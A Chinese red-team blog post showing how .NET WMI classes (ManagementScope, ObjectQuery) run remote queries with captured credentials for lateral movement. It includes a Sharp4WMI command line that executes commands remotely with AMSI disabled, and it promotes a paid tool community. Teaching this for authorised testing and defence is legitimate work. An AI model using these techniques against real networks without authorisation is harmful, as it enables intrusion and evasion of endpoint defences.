---
title: .NET | WMI横向移动在内网实战中的应用
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247498056&idx=1&sn=c02fd4139736caf5474a057a8f9b1979&chksm=fa5957a5cd2edeb3f23df543dd8d327577532ed7dd5fdbcc6c108e297a537b19b87c0e3315ec&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2025-01-08
fetch_date: 2025-10-06T20:10:50.290315
---

# .NET | WMI横向移动在内网实战中的应用

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9AiaXibTRdEnEfYuQx76FjZVTpZlTqibmPIa9k6HaA76icmSC0yUEmTVujQpTUb6G7PZL2J0Z2hDiaD3w/0?wx_fmt=jpeg)

# .NET | WMI横向移动在内网实战中的应用

专攻.NET安全的

dotNet安全矩阵

此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他方面。

在红队渗透测试中，WMI 是实现横向移动和信息收集的重要工具。通过 .NET 提供的 ObjectQuery、ManagementScope 等类，攻击者能够在不借助额外代理的情况下，远程查询目标系统的详细信息。

这种方法利用 WMI 的合法功能，通过 DCOM 协议与目标主机通信，不仅可以收集操作系统、网络配置等关键数据，还能进一步辅助漏洞利用和权限提升。在本文中，我们将从红队视角深入探讨如何高效利用这三类对象实现远程 WMI 查询。

01

ObjectQuery 基本介绍

**1.1 基本概念介绍**

**ObjectQuery** 类表示 WMI 查询语言（WQL）语句，用于从 WMI 数据存储中检索管理信息，是执行 WMI 查询的基础对象。

## WQL常见用法

WQL（Windows Query Language）语法类似于 SQL，用于查询 WMI 对象。例如

```
```
ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
```
```

02

ManagementObjectSearcher

**2.1 基本定义和功能**

**ManagementObjectSearcher** 用于执行 WMI 查询并返回结果。它结合 ObjectQuery 或直接接受查询字符串来检索数据。

## 常见构造函数用法

例如：ManagementObjectSearcher(string query) 接受一个 WQL 查询字符串。

```
```
ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
foreach (ManagementObject obj in searcher.Get())
{
    Console.WriteLine($"处理器名称: {obj["Name"]}");
}
```
```

03

ManagementScope

**3.1 基本定义和功能**

ManagementScope 定义 WMI 操作的作用域。默认情况下，作用域为本地计算机，但可以指定远程计算机或自定义命名空间。

## 常见构造函数用法

例如：ManagementScope(string scopePath) 接受一个 WMI 命名空间路径，例如 "\\root\\cimv2"

```
```
ManagementScope scope = new ManagementScope("\\\\RemoteComputer\\root\\cimv2");
scope.Connect();
```
```

04

常规的WMI目标操作查询

**4.1 利用WMI远程操作**

在红队渗透测试中，WMI 同样是实现横向移动的重要技术之一。下面从红队的视角，结合代码详细剖析如何通过 WMI 实现远程查询，为后续操作奠定基础。

## 定义目标命名空间和范围

ManagementScope 指定目标计算机和命名空间。在横向移动中，这通常是远程主机的 IP 或主机名（如 192.168.1.100），以及常见的 root\cimv2 命名空间。

```
```
ManagementScope scope = new ManagementScope(string.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);
scope.Connect();
```
```

通过连接远程管理范围，红队可以使用受控账户访问目标系统的信息。

## 使用凭据进行身份验证

在默认配置下，代码中通过 ConnectionOptions 设置凭据，使用目标系统的合法账号进行认证。

```
```
options.Username = username;
options.Password = password;
```
```

在获取到 NTLM 哈希或凭据后，红队可以使用已知账户实现横向移动。

## 查询目标系统信息

使用 ObjectQuery 创建 WMI 查询语句，例如获取操作系统信息（SELECT \* FROM Win32\_OperatingSystem）或网络适配器信息（SELECT \* FROM Win32\_NetworkAdapter）

```
```
ObjectQuery query = new ObjectQuery(wmiQuery);
ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
ManagementObjectCollection data = searcher.Get();
```
```

收集目标系统的操作系统版本、IP 地址、补丁状态等，用于识别漏洞或制定下一步攻击策略。

## 返回查询结果

遍历 ManagementObjectCollection 中的每个结果，提取属性信息并打印。例如，可以提取目标系统的版本号、主机名或服务状态。

```
```
foreach (ManagementBaseObject managementBaseObject in data)
{
    ManagementObject result = (ManagementObject)managementBaseObject;
    foreach (PropertyData prop in result.Properties)
    {
        Console.WriteLine($"{prop.Name} : {prop.Value}");
    }
}
```
```

提取信息后可进行后续操作，如针对特定操作系统执行漏洞利用。假设我们已经获取了目标主机 192.168.1.100 的管理员凭据并希望获取其操作系统版本以评估可用的漏洞利用工具。

```
```
string wmiQuery = "SELECT * FROM Win32_OperatingSystem";

//运行结果
  Scope: \\192.168.1.100\root\cimv2
  User credentials: admin

           Caption : Microsoft Windows 10 Pro
      OSArchitecture : 64-bit
           Version : 10.0.19044
       BuildNumber : 19044
```
```

操作系统版本为 Windows 10 Pro 19044，可能存在 SMB 漏洞（如 EternalBlue）。

05

基于WMI横向移动的工具

**5.1 Sharp4WMI**

Sharp4WMI 是一个基于.NET实现的内网横向移动工具，利用WMI进行远程命令执行、文件上传、环境变量操作等。该工具可绕过Windows防护机制ASMI并返回执行结果，适用于高级持久性威胁和红队活动。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibeicvDNVldcXTgRnFUFTwOqFiaxmvotGLncRvcMPGRYfTaMxUv0Kq3j2JMmZ2oibwfZeAxLmvDngJFA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

Sharp4WMI提供了多种功能，通过命令行参数指定不同的操作。以下是一些常用的命令及其功能介绍。

## 内网远程执行命令

Sharp4WMI总共提供10余种横向移动的命令，比如终止目标进程、上传文件、列出主机进程等等。比如，在内网远程计算机上192.168.101.86执行cmd命令。

```
```
Sharp4WMI.exe action=exec username="ivan1ee" password="123456" computername=192.168.101.86 command="whoami" result=true amsi=disable
```
```

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibeicvDNVldcXTgRnFUFTwOqntdVdlPbcSePC6G4icrhK0ibaTN6cbEN3m2gNKGYFRzaWzibxacI7FseA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

综上，通过 WMI，红队可以轻松实现远程系统信息收集、命令执行和持久化，是横向移动的重要技术手段之一。然而，这种技术同样容易被检测和防御。文章涉及的工具已经打包在星球，感兴趣的师傅们可以加入自取。

06

公众号安全技术精华内容

**6.1 .NET 精华回顾**

从漏洞分析到安全攻防，我们涵盖了 .NET 安全各个关键方面，为您呈现最新、最全面的 .NET 安全知识，下面是公众号发布的精华文章集合，推荐大伙阅读！

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8A7Qhn1ssuqNzv0iceS7ZhOuZ0AO4P1eFeG2xTdR2V6GWibiaxO2RenUJzrwOfvsdqofibI6H2uY0CLQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247497429&idx=2&sn=a07599921eeb651ce005f57ed350be5e&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8TQhCZMggf71ffibqISJ8f5naPJacnjn0roDyxxnAibmuwDJq2p1GTBpicZhnM9o9gTIu9S9ia8Uqwtw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&retryload=1&tp=webp)](https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247497498&idx=2&sn=00900a0c29c85b41fe6a586d7e5c3571&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9tl26Kh2sQYI9guTCflSwQP8Gs9z7iamicOvlQv4UYzjwd378D03h7yEYFtZ6xA74qicInoed7qpBWg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247495167&idx=1&sn=9280c55fdc7c9146e549be470cf9f120&chksm=fa594312cd2eca04bfe8fd1fd3890b389d9c700b9b69d897f919addac399bab4f4d2e55f6b4f&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOeP3ichLEiafhGiawd8mjkHYBalO37fN8QQkNdic1hjjY2Nvw2Bib6UvibDRA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490722&idx=2&sn=c9807daa5548e139a0c67303cb26882a&chksm=fa5ab24fcd2d3b59a85be03e69c655ffd644e8458bc2ec3f572da4b40b43e5003fda756f35b4&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOjWgak8cI7Mic1wTt3YSKqsbLl9rPe0cF9WGtOEuiceLreTNtNVib6IKlw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490703&idx=2&sn=e7db1ff662e5b41d9a1806fbdf33e204&chksm=fa5ab262cd2d3b7470f029b9a07d1dd3611e63be910b01a601144efe7d84b5f016f488a354cf&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxO8jJ97qqWlY6XR03DqSnutcHFYibDtVG5Y2wEaK4p2bzEicZblY4oQyGg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490700&idx=2&sn=e8a865ada7c743e77fb9e953c5da74b1&chksm=fa5ab261cd2d3b7736387eddfc8524a378a1604552d0c9b55476646f9e8275f48818aab8acad&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOe1viaia4aoFceunsUdIna4DPbmemW1EqlBMrovOoE6bdAFF3iaApxz5qA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488736&idx=2&sn=d24aaa297c51eb620ccdf67af513086d&chksm=fa5aba0dcd2d331bbb22f3f5657199d718c90efed42fcb9cb67ec23d342f887c117e4858f1cb&scene=21#wechat_redirect)

07

欢迎加入.NET 安全矩阵星球

**7.1 .NET 安全社区**

目前dot.Net安全矩阵星球已成为中国.NET安全领域最知名、最专业的技术知识库之一，超 **1200+** 成员一起互动学习。星球主题数量近 **600+**，精华主题 230+，PDF文档和压缩包 300+ 。从Web应用到PC端软件应用，无论您是初学者还是经验丰富的开发人员，都能在这里找到对应的实战指南和最佳实践。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9AiaXibTRdEnEfYuQx76FjZVjmyEWtIaDuDePFFmyRqggiaq2k47pLoib9GZtUCOhaP40WPlhvbiaKZVg/640?wx_fmt=jpeg&from=appmsg)

**7.2 20+个专栏文章**

星球文化始终认为授人以鱼不如授人以渔！星球整理出**20+**个专题栏目涵盖 **.NET安全 点、线、面、体等知识范围**，助力师傅们实战攻防！其中主题包括.NET  内网攻防、漏洞分析、内存马、代码审计、预编译、反序列化、WebShell免杀、命令执行、工具库等等。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopa90SJRuwnLy9uZV4icrXiaZlJPQlYJWXTw8HCrF9oTcE3DDgrdFnXo2BA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

**7.3 星球海量的工具**

截至当前，dot.Net安全矩阵星球社区汇聚了 **600+** 个实用工具和高质量PDF学习资料。这些资源涵盖了攻防对抗的各个方面，在实战中能够发挥显著作用，为对抗突破提供强有力的支持。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopaqVZW8XsALVA4FNiaj32q8npN82VSeqSKb4fQvLiczFNs0099VRFVQwPA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.c...